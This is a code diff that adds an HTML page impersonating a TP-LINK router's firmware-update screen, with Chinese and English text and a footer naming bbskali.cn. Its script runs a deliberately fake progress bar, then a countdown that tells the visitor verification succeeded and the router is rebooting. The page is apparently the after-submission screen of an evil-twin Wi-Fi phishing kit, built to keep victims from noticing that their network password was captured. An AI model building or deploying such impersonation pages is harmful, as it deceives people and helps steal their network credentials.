@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang=en> <head><title>Router Configuration Page</title><meta charset=utf-8><meta name=viewport content="width=device-width, initial-scale=1"><link rel=stylesheet href=bootstrap.min.css><script src=jquery.min.js></script><script src=bootstrap.min.js></script><!-- CSS --><style type=text/css>
+
+    /* Sticky footer styles
+    -------------------------------------------------- */
+
+    html,
+    body {
+          height: 100%;
+          /* The html and body elements cannot have any padding or margin. */
+        }
+
+        /* Wrapper for page content to push down footer */
+        #wrap {
+          min-height: 100%;
+          height: auto !important;
+          height: 100%;
+          /* Negative indent footer by it's height */
+          margin: 0 auto -60px;
+        }
+
+        /* Set the fixed height of the footer here */
+        #push,
+        #footer {
+          height: 60px;
+        }
+        #footer {
+          background-color: #f5f5f5;
+        }
+
+        /* Lastly, apply responsive CSS fixes as necessary */
+        @media (max-width: 767px) {
+          #footer {
+            margin-left: -20px;
+            margin-right: -20px;
+            padding-left: 20px;
+            padding-right: 20px;
+          }
+        }
+
+        #clockdiv{
+           font-family: sans-serif;
+           color: #fff;
+           display: inline-block;
+           font-weight: 100;
+           text-align: center;
+           font-size: 30px;
+         }
+
+        #clockdiv > div{
+           padding: 10px;
+           border-radius: 3px;
+           background: #00BF96;
+           display: inline-block;
+         }
+
+        #clockdiv div > span{
+          padding: 15px;
+          border-radius: 3px;
+          background: #00816A;
+          display: inline-block;
+        }
+
+      .smalltext{
+         padding-top: 5px;
+         font-size: 16px;
+       }
+
+          }
+  </style></head> <body> <!-- Start navigation bar --> <!-- To change the navigation bar color change background attribute --> <nav class="navbar navbar-inverse" style=background:RoyalBlue;margin-top:2em;> <div class=container-fluid> <div class=navbar-header> <button type=button class=navbar-toggle data-toggle=collapse data-target=#myNavbar> <span class=icon-bar></span> <span class=icon-bar></span> <span class=icon-bar></span> </button> 
+	<div><svg width="160" height="41" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+
+ <g>
+  <title>background</title>
+  <rect fill="none" id="canvas_background" height="479" width="1060" y="-1" x="-1"/>
+ </g>
+ <g>
+  <title>Layer 1</title>
+  <image xlink:href="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIQAAAAhCAYAAAAYlQP6AAAF8ElEQVR4nO2baYwURRSAv91ZFFDAgLDe/hAT0SgIaqKo8YeiJOB6Ro0iRNGAeMQjSoiBCBqviP5QY0AT4wFRMKgIYjxwjUcIJHgAHsEDERU1nMsRXLfMS7+Roquqp2emZ4Sd+ZLOTF511XRVv3r13quaBmMMdWqGA4GrgQuAvsBfwCLgJaBNBqGuELXD2cBM4EfgTWAtcBRwsX7eALTWFaI2OAH4BLgbeEF73ADs0O9jgceAoXWFqA0+ABYDDwErgA1AB9BVleR9YCpwVl0hOj/HAW+rlTgY+AgYrErxADACGAj0EivSVOujVQPIy/4J2A40AjlVgo3AIOAzHYLNwPLGWh+tGiCnywPWMnGJRhbiQ4y3hqC9rhCdn5UaRTSpI7kJuAg4AxgCHK8j0F2sSV0hOj9f6fJwnX7ur76EKMqrVtQxWixI3amsDc4EFgLXAGuAL6xeDwX6AC8CI+sKUTtcCTwKLADmA78Bzepgtmj4OauuELWF+BITgHM0jd2mYeiTajnqqesaRqKPf+LdF4UQc7FfBuMizss3wCGS8XJK07NBY+PtRdQ5ADhfO2mzS5Myu5waYSSBM8pT+ifwhA7itcAxKu8CGE0NL3RqhRkJnAh8D7yid8nsPdJT4zVgqSPdTR995pzmGtqBZ4Gtzp2FMMbsNNkwRayNMWZEBq2tMsacou2lufo7LUTsMsY0F9GOXJc7rUSsM8Z00XuWOKURs40x3Txt+q65WqfVKlvhtBhxk6d+/mr2PM/txpic596CV6PGplnimKESGADMBXqnrNphbdTYFGNl8vztSCLs2dbmlEaI4/a0I/WTf7ZtKdoNWbhmtYCnWbIbgcdLfQ9Nav58S8YUyyzazNaHiLPckeyJmMb7YrIGNdET1OzbHF3kAIfIWuELMQZYBjxV4L5ykaX5LeBkq52bdYu7ZJqs9SvOuIBCfKwxa7GsT6gna94kRwrnlqkQOV3jq8104HP1KypBPw0fB1tt35mFEiZlKuMOWp6ujiQdofaEnx1JxOGOZN9ALO7LwKEVeNojgHdiyjBRlbBskhSimoR2XUPytDRUuI/yYr5zpBGy5D1fYCKkJb/sHaaRzCCrniztD2fUn71GIcol5Cc0ZvRCQqxUP2dnoHwYcL8jLZ423X9YpKFqnml6sCUz9pXzEKE8g9CaEBlUmp7qTN8KzAj8lpjzJcDrTkl6jgVusZRB+vsIMDnr/u0tCtHhSCLyM79ZkzM+hqkD56PSFiLPTI2WbnNKIp4Dvga+dUrSMTnWjy3AM5XoSDWXjNBLR/PqPto9smKotA9hcxfwniON6K1OZnenJB1xpe6jIWe/rDtRTQshg9E/JpOXdSpwh3N3xDL93KTn/3wh5A+6x/9/067/efg0EK4P0RB6jFNSGgN1GRqux98yoZoKcZKaTZsGj/bn2ax7B+j+xr3OHbvxvQBU4XxKVCn+UCfzQ0+iDT2EsrTIfIHRfYnhGnLanA7M0e1rX6a2aKq5ZDSoAtpXSBl+By5LCOnidOjA+X4zFIFUimWaPg4xXa3FlkC5rw/vWgdj45yn2eNMFL+aFkJmzzxH6rJGD4CudUrC7EjwN6qtEMIsjQgmOiVR0koytuuckjC99JTTpcAbQI/YnS3quI4OTIzUVFMhVms6vBJs1RnXM9Z2LkFRKs0k3aRr8fzOAL2KZbGemJ7nccRH6UbZ+BLa/Y9qLhmh5SELtul/Fn1cCBykTm2hK1fuDLMwerB1lVNSHhLJXBHwGcbpv7NKpjP9UWdB4GDOgxrFhLaQbcYmbEGXgjjDV+mGYNzMl8NCVYo5ngjrHp0g00ppP8lCdHMkEYWcl5AlCLWXFTMSElR9daOs0NUjYUy6e76n2ej7Erg+wfJ0C3y38Y35fD1F7VsSp2pUFnoXQZIsRKs6gnFWO5I9WR9I0MRDzqzZqNvl4/TASClJoF91dvmeX5zc/EuVpJAsUXJANQ0ykyWXItZCHMQ8YrXscyShMZe/4vmQQ0SSxpaQ1EYcaQlRZbf1l9S9B/4F4JPs9ThC2TMAAAAASUVORK5CYII=" height="33" width="132" y="1" x="8" data-name="图层 1" id="图层_1"/>
+ </g>
+</svg></div> </div> </div> </nav> <!-- End navigation bar --> <!-- Start firt phase --> <div class=container> <div> <h2 class=text-center style=color:CornflowerBlue>正在更新 请稍等</h2> <p class=lead>验证成功，正在更新固件。 这可能需要一段时间请稍等重新连接网络……</p> </div> <!-- Start porgress bar --> <div id=instance class=progress> <div class="progress-bar progress-bar-striped active" role=progressbar aria-valuenow=0 aria-valuemin=0 aria-valuemax=100 style="width: 0%;"> <span class=sr-only>0% Complete</span> </div> </div> <!-- End porgress bar --> <div id=push></div> </div> <!-- End first phase --> <!-- Start second phase --> <div class="container show-on-done hidden"> <div class="row content"> <div class=col-sm> <div> <p class=lead>The update was successful and currently it's being installed. The router is being rebooted and you will lose access to the internet. Please allow the timer to expire before you connect back to the router.</p> </div> </div> <!-- start of the countdown --> <div class="col-sm text-center"> <div id=clockdiv> <div> <span class=minutes></span> <div class=smalltext>Minutes</div> </div> <div> <span class=seconds></span> <div class=smalltext>Seconds</div> </div> </div> </div> <!-- end of the countdown --> </div> <div id=push></div> </div> <!-- End second phase --> <!-- Start footer --> <footer class=footer> <div class="container text-center"> <p class=text-muted>TP-LINK© 2020, All Rights bbskali.cn</p> </div> </footer> <!-- End footer --> <!-- Start upgrade first message --> <div class="modal fade" id=upgrade-only role=dialog> <div class="modal-dialog modal-sm"> <div class=modal-content> <div class=modal-header> <button type=button class=close data-dismiss=modal>&times;</button> <h4 class=modal-title>Information</h4> </div> <div class=modal-body> <p>Please Wait For Update To Finish.</p> </div> <div class=modal-footer> <button type=button class="btn btn-default" data-dismiss=modal>Close</button> </div> </div> </div> </div> <!-- End upgrade first message --> <script>
+/*
+  Increases the progress bar
+*/
+function fakeProgress(container, durationInMs, onDone) {
+    var intervalInMS = 200;
+    var doneDelay = intervalInMS * 2;
+    var bar = container.find('.progress-bar');
+    var srOnly = bar.find('.sr-only');
+    var percent = 0;
+
+    var interval = setInterval(function updateBar() {
+        percent += 100 * (intervalInMS/durationInMs);
+        bar.css({width: percent + '%'});
+        bar['aria-valuenow'] = percent;
+        srOnly.text(percent + '% Complete');
+
+        if (percent >= 100) {
+            clearInterval(interval);
+            setTimeout(function() {
+                if (typeof onDone === 'function') {
+                    onDone();
+                }
+            }, doneDelay);
+        }
+    }, intervalInMS);
+}
+
+/*
+  Used to show content after the progress bar is done
+*/
+function onDone() {
+    $('.show-on-done').removeClass('hidden');
+
+    var deadline = new Date(Date.parse(new Date()) + 5 * 60 * 1000);
+    initializeClock('clockdiv', deadline);
+}
+
+/*
+  Calculates the remaning time
+*/
+function getTimeRemaining(endtime) {
+  var t = Date.parse(endtime) - Date.parse(new Date());
+  var seconds = Math.floor((t / 1000) % 60);
+  var minutes = Math.floor((t / 1000 / 60) % 60);
+
+  return {
+    'total': t,
+    'minutes': minutes,
+    'seconds': seconds
+  };
+}
+
+/*
+  Creates the clock related content
+*/
+function initializeClock(id, endtime) {
+  var clock = document.getElementById(id);
+  var minutesSpan = clock.querySelector('.minutes');
+  var secondsSpan = clock.querySelector('.seconds');
+
+  function updateClock() {
+    var t = getTimeRemaining(endtime);
+
+
+    minutesSpan.innerHTML = ('0' + t.minutes).slice(-2);
+    secondsSpan.innerHTML = ('0' + t.seconds).slice(-2);
+
+    if (t.total <= 0) {
+      clearInterval(timeinterval);
+    }
+  }
+
+  // updating the countdown
+  updateClock();
+  var timeinterval = setInterval(updateClock, 1000);
+}
+
+// speed of the progress bar in milliseconds
+var duration = 100000;
+
+// start the progress bar
+fakeProgress($('#instance'), duration, onDone);
+
+</script> </body> </html> 
